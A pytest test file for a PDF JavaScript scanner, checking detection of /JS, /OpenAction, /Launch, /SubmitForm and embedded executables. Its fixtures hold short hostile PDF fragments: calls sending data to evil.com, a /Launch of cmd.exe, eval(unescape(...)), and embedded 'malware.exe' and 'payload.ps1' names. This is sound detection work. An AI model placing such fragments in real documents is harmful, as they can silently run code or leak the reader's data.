"""
Tests for pdf_js_scanner — PDF JavaScript deep-scanner.

Coverage:
- Clean PDFs produce no findings
- /JS and /JavaScript action detection
- /OpenAction trigger detection
- /AA (Additional Actions) detection
- Named actions: Launch, URI, SubmitForm, GoToR, ImportData
- AcroForm + JavaScript combination
- Embedded executable files
- Embedded non-executable files
- Incremental update injection (multiple %%EOF)
- Multiple startxref entries
- Suspicious JS calls: eval, launchURL, getURL, submitForm
- Non-PDF content rejected quickly
- Empty input handling
- Bytes input handling
- Graceful handling of garbled / binary data
- Severity levels are valid enum members
- Confidence values are in [0.0, 1.0]
- Finding dataclass is frozen (immutable)
"""

from __future__ import annotations

import pytest

from hermes_katana.scanner.pdf_js_scanner import (
    PDFJSSeverity,
    detect_pdf_js,
)

# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------

_HEADER = "%PDF-1.7\n"


def _pdf(body: str) -> str:
    """Prepend a PDF header so the scanner passes the quick PDF check."""
    return _HEADER + body


def _pdf_bytes(body: str) -> bytes:
    return _pdf(body).encode("latin-1")


# ---------------------------------------------------------------------------
# Clean cases
# ---------------------------------------------------------------------------


class TestCleanCases:
    def test_empty_string_no_findings(self):
        assert detect_pdf_js("") == []

    def test_non_pdf_no_findings(self):
        assert detect_pdf_js("Hello, this is plain text.") == []

    def test_html_no_findings(self):
        assert detect_pdf_js("<html><body>no pdf</body></html>") == []

    def test_minimal_clean_pdf(self):
        # A minimal PDF with no JavaScript, no actions
        content = _pdf("1 0 obj\n<</Type /Catalog>>\nendobj\n%%EOF\n")
        assert detect_pdf_js(content) == []

    def test_pdf_with_uri_text_not_uri_action(self):
        # The word "URI" in a text stream should not trigger /URI action
        content = _pdf("BT /F1 12 Tf (Visit https://example.com for details) Tj ET\n%%EOF\n")
        findings = detect_pdf_js(content)
        # /URI action requires /URI (dictionary key), not just the text "URI"
        uri_findings = [f for f in findings if f.action_type == "uri_action"]
        assert uri_findings == []


# ---------------------------------------------------------------------------
# /JS and /JavaScript detection
# ---------------------------------------------------------------------------


class TestJSEntries:
    def test_slash_js_key_detected(self):
        content = _pdf("/JS (app.alert('XSS'));")
        findings = detect_pdf_js(content)
        js = [f for f in findings if f.action_type == "js_entry"]
        assert len(js) >= 1
        assert js[0].severity == PDFJSSeverity.HIGH

    def test_slash_javascript_key_detected(self):
        content = _pdf("/JavaScript << /S /JavaScript /JS (var x=1;) >>")
        findings = detect_pdf_js(content)
        js = [f for f in findings if f.action_type == "js_entry"]
        assert len(js) >= 1

    def test_eval_call_in_js(self):
        content = _pdf("/JS (eval(unescape('%61%6c%65%72%74')));")
        findings = detect_pdf_js(content)
        calls = [f for f in findings if f.action_type == "js_call" and "eval" in f.description]
        assert len(calls) >= 1
        assert calls[0].severity == PDFJSSeverity.HIGH

    def test_get_url_call_in_js(self):
        content = _pdf("/JS (getURL('http://evil.com/payload'));")
        findings = detect_pdf_js(content)
        calls = [f for f in findings if f.action_type == "js_call"]
        assert len(calls) >= 1

    def test_launch_url_in_js(self):
        content = _pdf("/JS (app.launchURL('http://evil.com'));")
        findings = detect_pdf_js(content)
        calls = [f for f in findings if f.action_type == "js_call"]
        assert len(calls) >= 1

    def test_submit_form_in_js(self):
        content = _pdf("/JS (this.submitForm({cURL: 'http://evil.com/steal'}));")
        findings = detect_pdf_js(content)
        calls = [f for f in findings if f.action_type == "js_call"]
        assert len(calls) >= 1


# ---------------------------------------------------------------------------
# /OpenAction detection
# ---------------------------------------------------------------------------


class TestOpenAction:
    def test_open_action_detected(self):
        content = _pdf("/OpenAction << /S /JavaScript /JS (app.alert('auto')) >>")
        findings = detect_pdf_js(content)
        oa = [f for f in findings if f.action_type == "open_action"]
        assert len(oa) >= 1
        assert oa[0].severity == PDFJSSeverity.CRITICAL

    def test_aa_additional_action_detected(self):
        content = _pdf("/AA << /O << /S /JavaScript /JS (app.alert('on-open')) >> >>")
        findings = detect_pdf_js(content)
        aa = [f for f in findings if f.action_type == "additional_action"]
        assert len(aa) >= 1
        assert aa[0].severity == PDFJSSeverity.HIGH


# ---------------------------------------------------------------------------
# Named actions
# ---------------------------------------------------------------------------


class TestNamedActions:
    def test_launch_action_critical(self):
        content = _pdf("/Launch << /F (cmd.exe) /P (/c calc.exe) >>")
        findings = detect_pdf_js(content)
        la = [f for f in findings if f.action_type == "launch_action"]
        assert len(la) >= 1
        assert la[0].severity == PDFJSSeverity.CRITICAL
        assert la[0].confidence >= 0.9

    def test_uri_action_detected(self):
        content = _pdf("/URI (http://evil.com/phish)")
        findings = detect_pdf_js(content)
        ua = [f for f in findings if f.action_type == "uri_action"]
        assert len(ua) >= 1
        assert ua[0].severity == PDFJSSeverity.MEDIUM

    def test_submit_form_action_detected(self):
        content = _pdf("/SubmitForm << /F (http://evil.com/collect) >>")
        findings = detect_pdf_js(content)
        sf = [f for f in findings if f.action_type == "submit_form"]
        assert len(sf) >= 1
        assert sf[0].severity == PDFJSSeverity.HIGH

    def test_goto_remote_detected(self):
        content = _pdf("/GoToR << /F (remote.pdf) /D [0 /Fit] >>")
        findings = detect_pdf_js(content)
        gr = [f for f in findings if f.action_type == "goto_remote"]
        assert len(gr) >= 1

    def test_import_data_detected(self):
        content = _pdf("/ImportData << /F (http://evil.com/data.fdf) >>")
        findings = detect_pdf_js(content)
        id_findings = [f for f in findings if f.action_type == "import_data"]
        assert len(id_findings) >= 1
        assert id_findings[0].severity == PDFJSSeverity.HIGH


# ---------------------------------------------------------------------------
# AcroForm + JavaScript
# ---------------------------------------------------------------------------


class TestAcroFormJS:
    def test_acroform_with_js_detected(self):
        content = _pdf("/AcroForm << /Fields [...] >>\n/JS (app.alert('keystroke'));")
        findings = detect_pdf_js(content)
        af = [f for f in findings if f.action_type == "acroform_js"]
        assert len(af) >= 1
        assert af[0].severity == PDFJSSeverity.HIGH

    def test_acroform_without_js_no_acroform_finding(self):
        content = _pdf("/AcroForm << /Fields [] >>")
        findings = detect_pdf_js(content)
        af = [f for f in findings if f.action_type == "acroform_js"]
        assert af == []


# ---------------------------------------------------------------------------
# Embedded executables
# ---------------------------------------------------------------------------


class TestEmbeddedFiles:
    def test_embedded_exe_detected(self):
        content = _pdf("/EmbeddedFile\n/F (malware.exe)\n")
        findings = detect_pdf_js(content)
        ef = [f for f in findings if f.action_type == "embedded_executable"]
        assert len(ef) >= 1
        assert ef[0].severity == PDFJSSeverity.CRITICAL
        assert "malware.exe" in ef[0].content

    def test_embedded_ps1_detected(self):
        content = _pdf("/EmbeddedFile\n/F (payload.ps1)\n")
        findings = detect_pdf_js(content)
        ef = [f for f in findings if f.action_type == "embedded_executable"]
        assert len(ef) >= 1

    def test_embedded_pdf_not_executable(self):
        # Embedded PDF should not be flagged as executable
        content = _pdf("/EmbeddedFile\n/F (attachment.pdf)\n")
        findings = detect_pdf_js(content)
        ef = [f for f in findings if f.action_type == "embedded_executable"]
        assert ef == []

    def test_embedded_file_no_filename_medium_finding(self):
        # /EmbeddedFile with no filename still flagged at MEDIUM
        content = _pdf("/EmbeddedFile\n<< /Length 100 >>\nstream\n...binary...\nendstream\n")
        findings = detect_pdf_js(content)
        ef = [f for f in findings if f.action_type in ("embedded_file", "embedded_executable")]
        assert len(ef) >= 1
        assert findings[0].severity in (PDFJSSeverity.MEDIUM, PDFJSSeverity.CRITICAL)


# ---------------------------------------------------------------------------
# Incremental update injection
# ---------------------------------------------------------------------------


class TestIncrementalUpdate:
    def test_multiple_eof_markers(self):
        content = _pdf("1 0 obj <</Type /Catalog>> endobj\nstartxref\n9\n%%EOF\n")
        content += "2 0 obj <</Type /Action /S /JavaScript /JS (evil)>> endobj\nstartxref\n50\n%%EOF\n"
        findings = detect_pdf_js(content)
        iu = [f for f in findings if f.action_type == "incremental_update"]
        assert len(iu) >= 1
        assert iu[0].severity == PDFJSSeverity.HIGH
        assert "2" in iu[0].content  # reports count

    def test_many_startxref_entries(self):
        body = "startxref\n0\n%%EOF\n" * 5
        content = _pdf(body)
        findings = detect_pdf_js(content)
        mx = [f for f in findings if f.action_type == "multi_xref"]
        assert len(mx) >= 1
        assert mx[0].severity == PDFJSSeverity.MEDIUM

    def test_single_eof_clean(self):
        content = _pdf("1 0 obj <</Type /Catalog>> endobj\nstartxref\n9\n%%EOF\n")
        findings = detect_pdf_js(content)
        iu = [f for f in findings if f.action_type == "incremental_update"]
        assert iu == []


# ---------------------------------------------------------------------------
# Bytes input
# ---------------------------------------------------------------------------


class TestBytesInput:
    def test_bytes_input_accepted(self):
        content = _pdf_bytes("/OpenAction << /S /JavaScript /JS (app.alert('hi')) >>")
        findings = detect_pdf_js(content)
        oa = [f for f in findings if f.action_type == "open_action"]
        assert len(oa) >= 1

    def test_empty_bytes_no_findings(self):
        assert detect_pdf_js(b"") == []

    def test_garbled_bytes_no_crash(self):
        findings = detect_pdf_js(b"\x00\xff\xfe\xfd" * 50)
        assert isinstance(findings, list)


# ---------------------------------------------------------------------------
# Finding data integrity
# ---------------------------------------------------------------------------


class TestFindingStructure:
    def test_severity_is_valid_enum(self):
        content = _pdf("/OpenAction << /S /JavaScript >>")
        findings = detect_pdf_js(content)
        assert len(findings) > 0
        for f in findings:
            assert isinstance(f.severity, PDFJSSeverity)

    def test_confidence_in_range(self):
        content = _pdf("/JS (eval('danger'));")
        findings = detect_pdf_js(content)
        for f in findings:
            assert 0.0 <= f.confidence <= 1.0

    def test_finding_is_frozen(self):
        content = _pdf("/Launch << /F (evil.exe) >>")
        findings = detect_pdf_js(content)
        assert len(findings) > 0
        with pytest.raises((AttributeError, TypeError)):
            findings[0].severity = PDFJSSeverity.LOW  # type: ignore[misc]

    def test_all_fields_non_empty(self):
        content = _pdf("/JS (app.alert('test'));")
        findings = detect_pdf_js(content)
        for f in findings:
            assert f.action_type
            assert f.location
            assert f.description
